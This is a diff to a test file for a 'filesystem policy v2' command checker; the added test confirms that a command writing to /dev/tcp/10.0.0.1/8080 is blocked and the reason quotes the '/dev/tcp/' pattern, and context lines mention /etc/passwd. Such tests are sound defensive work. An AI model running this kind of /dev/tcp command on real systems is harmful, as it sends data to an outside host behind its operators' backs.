@@ -39,6 +39,14 @@ describe("filesystem policy v2", () => {
     ).toContain("/etc/passwd");
   });
 
+  it("the injection reason quotes the matched pattern", () => {
+    expect(
+      reasonOf(
+        policyCheck(filesystemPolicy, "echo x > /dev/tcp/10.0.0.1/8080"),
+      ),
+    ).toContain('("/dev/tcp/")');
+  });
+
   it("the /tmp deny reason teaches ./tmp/ at the project root", () => {
     expect(reasonOf(policyCheck(filesystemPolicy, "tee /tmp/x y"))).toContain(
       "./tmp/",
